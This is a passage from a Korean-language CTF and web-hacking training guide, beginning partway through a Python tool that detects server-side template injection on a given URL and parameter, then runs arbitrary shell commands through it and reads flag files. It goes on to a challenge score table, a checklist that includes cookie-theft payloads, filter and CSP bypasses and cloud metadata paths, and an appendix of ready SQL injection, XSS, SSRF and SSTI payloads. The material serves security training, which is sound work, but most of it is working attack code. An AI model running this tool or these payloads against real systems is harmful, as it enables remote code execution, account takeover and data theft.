    for payload, expected, engine_hint in DETECT_PAYLOADS:
        result = send_payload(cfg, payload)
        if result and expected in result:
            print(f"[+] SSTI 탐지 성공! 페이로드: {payload!r}")
            print(f"    예상 결과: {expected!r} / 실제 응답 포함 확인")
            print(f"    추정 엔진: {engine_hint}")
            # jinja2/twig 구분
            if "jinja2/twig" in engine_hint:
                r2 = send_payload(cfg, "{{7*'7'}}")
                if r2 and "7777777" in r2:
                    return "jinja2"
                elif r2 and "49" in r2:
                    return "twig"
            return engine_hint.split("/")[0]

    print("[-] SSTI 탐지 실패")
    return None


def exploit_rce(cfg: SstiConfig, engine: str, cmd: str) -> Optional[str]:
    """RCE 페이로드로 명령 실행."""
    payloads = RCE_PAYLOADS.get(engine, [])
    if not payloads:
        print(f"[-] {engine}용 RCE 페이로드 없음", file=sys.stderr)
        return None

    for template_payload in payloads:
        # 명령 교체
        payload = template_payload.replace("id", cmd)
        print(f"[*] 시도: {payload[:80]}...")
        result = send_payload(cfg, payload)
        if result:
            # uid= 패턴 또는 플래그 패턴 탐색
            uid_match = re.search(r"uid=\d+", result)
            flag_match = re.search(r"(?:CTF|FLAG|flag)\{[^}]+\}", result)
            if uid_match or flag_match:
                target = flag_match.group() if flag_match else uid_match.group()  # type: ignore[union-attr]
                print(f"[+] 명령 실행 성공: {target}")
                return result

    return None


def extract_flag(cfg: SstiConfig, engine: str) -> Optional[str]:
    """플래그 파일 자동 탐색 및 추출."""
    flag_paths = ["/flag", "/flag.txt", "/home/ctf/flag", "/root/flag.txt"]

    for path in flag_paths:
        cmd = f"cat {path}"
        print(f"[*] 플래그 탐색: {path}")
        result = exploit_rce(cfg, engine, cmd)
        if result:
            flag_match = re.search(r"(?:CTF|FLAG|flag|[A-Z]+)\{[^}]+\}", result)
            if flag_match:
                return flag_match.group()
            print(f"    응답: {result.strip()[:100]}")

    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSTI 탐지 및 RCE 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="대상 URL")
    parser.add_argument("--param", required=True, help="SSTI 취약 파라미터")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument(
        "--engine",
        choices=["auto", "jinja2", "twig", "mako", "erb", "freemarker"],
        default="auto",
        help="템플릿 엔진 (기본: auto 탐지)",
    )
    parser.add_argument("--cmd", default="id", help="실행할 명령 (기본: id)")
    parser.add_argument("--detect-only", action="store_true", help="탐지만 수행")
    parser.add_argument("--find-flag", action="store_true", help="플래그 자동 탐색")
    parser.add_argument("--cookie", default="", help="쿠키 문자열")

    args = parser.parse_args()

    cookies: dict[str, str] = {}
    if args.cookie:
        for kv in args.cookie.split(";"):
            kv = kv.strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                cookies[k] = v

    cfg = SstiConfig(
        url=args.url,
        param=args.param,
        method=args.method,
        engine=args.engine,
        cookies=cookies or None,
    )

    print(f"[*] 대상: {cfg.url} (파라미터: {cfg.param})")

    # 엔진 결정
    engine: Optional[str]
    if args.engine == "auto":
        engine = detect_engine(cfg)
        if not engine:
            sys.exit(1)
    else:
        engine = args.engine
        print(f"[*] 엔진 지정: {engine}")

    if args.detect_only:
        print(f"[+] 탐지 완료: {engine}")
        sys.exit(0)

    # 플래그 자동 탐색
    if args.find_flag:
        flag = extract_flag(cfg, engine)
        if flag:
            print(f"\n[+] 플래그: {flag}")
        else:
            print("[-] 플래그 탐색 실패")
            sys.exit(1)
    else:
        # 단일 명령 실행
        result = exploit_rce(cfg, engine, args.cmd)
        if result:
            print(f"\n[+] 결과:\n{result}")
        else:
            print("[-] RCE 실패")
            sys.exit(1)


if __name__ == "__main__":
    main()
```

---

## 6. 점수표 및 학습 체크리스트

### 6.1 난이도별 문제 표

| # | 문제 | 취약점 | 난이도 | 점수 | 핵심 기법 | 예상 소요시간 |
|---|------|--------|--------|------|-----------|---------------|
| 1 | Login Bypass | SQL 인젝션 (에러 기반) | Easy | 100 | `' OR 1=1--` | 15분 |
| 2 | Data Leak | SQL 인젝션 (UNION) | Easy | 150 | UNION SELECT | 20분 |
| 3 | Blind Flag | SQL 인젝션 (Boolean Blind) | Medium | 250 | 이진 탐색 | 45분 |
| 4 | Time Bomb | SQL 인젝션 (Time-based) | Medium | 300 | SLEEP() | 60분 |
| 5 | Reflector | Reflected XSS | Easy | 100 | 기본 `<script>` | 15분 |
| 6 | Board Hack | Stored XSS | Medium | 200 | 쿠키 탈취 | 30분 |
| 7 | CSP Bypass | XSS + CSP 우회 | Hard | 400 | JSONP, nonce | 90분 |
| 8 | DOM Pwn | DOM XSS | Hard | 350 | innerHTML 싱크 | 60분 |
| 9 | Inner Reach | SSRF (기본) | Medium | 250 | 내부 IP 접근 | 30분 |
| 10 | AWS Leak | SSRF + 메타데이터 | Hard | 450 | IMDSv2 우회 | 90분 |
| 11 | Template Fun | SSTI (Jinja2) | Medium | 300 | `{{7*7}}` | 45분 |
| 12 | RCE Master | SSTI → RCE | Hard | 500 | 서브클래스 체인 | 120분 |
| 13 | Chain Attack | SQLi + SSRF 연계 | Insane | 800 | 복합 | 180분 |
| 14 | Full Pwn | XSS + CSRF + SSRF | Insane | 1000 | 완전 체인 | 240분 |

### 6.2 학습 체크리스트

**SQL 인젝션**

- [ ] 에러 기반 SQLi 수동 탐지 가능
- [ ] UNION SELECT로 컬럼 수 파악 및 데이터 추출
- [ ] Boolean Blind SQLi 수동 구현 (이진 탐색)
- [ ] Time-based SQLi SLEEP() 활용
- [ ] 2차 SQLi (저장 후 실행) 이해
- [ ] WAF 우회 기법 3가지 이상 숙지
- [ ] sqlmap 기본/고급 옵션 사용 능숙

**XSS**

- [ ] Reflected / Stored / DOM XSS 구분
- [ ] `<script>alert(1)</script>` 이외 페이로드 10개 이상 암기
- [ ] 쿠키 탈취 페이로드 작성 및 수신 서버 운영
- [ ] CSP 헤더 분석 및 우회 기법 적용
- [ ] 필터/WAF 우회 (대소문자, 이벤트 핸들러, 인코딩)
- [ ] BeEF (Browser Exploitation Framework) 기본 사용

**SSRF**

- [ ] SSRF 취약 엔드포인트 탐지 패턴 숙지
- [ ] 내부 IP 범위 (169.254.169.254, 10.x, 192.168.x) 숙지
- [ ] AWS / GCP / Azure 메타데이터 경로 암기
- [ ] IP 인코딩 우회 (10진수, 16진수, 축약형)
- [ ] DNS 리바인딩 공격 원리 이해
- [ ] SSRF → RCE 체인 구성 경험

**SSTI**

- [ ] 탐지 페이로드 `{{7*7}}`, `${7*7}` 등 숙지
- [ ] Jinja2 / Twig / Mako 엔진 구분법 이해
- [ ] Jinja2 서브클래스 체인으로 RCE 실현
- [ ] 언더스코어 필터 우회 기법 적용
- [ ] SSTImap 도구 기본 사용

**종합**

- [ ] Burp Suite Intruder로 자동 퍼징 수행
- [ ] ffuf로 파라미터 및 엔드포인트 발굴
- [ ] Python requests로 커스텀 익스플로잇 작성
- [ ] 취약점 리포트 (재현 단계 포함) 작성 경험
- [ ] CTF 플랫폼 (HackTheBox, TryHackMe, picoCTF) 문제 10개 이상 풀이

---

## 부록: 빠른 참조 페이로드 모음

### SQL 인젝션

```
# 로그인 우회
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x

# UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--

# 주석 변형
--
#
/**/
-- -
;--
```

### XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
javascript:alert(1)
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### SSRF

```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://2130706433/    (127.0.0.1)
http://0x7f000001/   (127.0.0.1)
http://192.168.0.1/
```

### SSTI

```
{{7*7}}
${7*7}
{{7*'7'}}
<%= 7*7 %>
{{config}}
{{request}}
{{''.__class__.__mro__}}
```
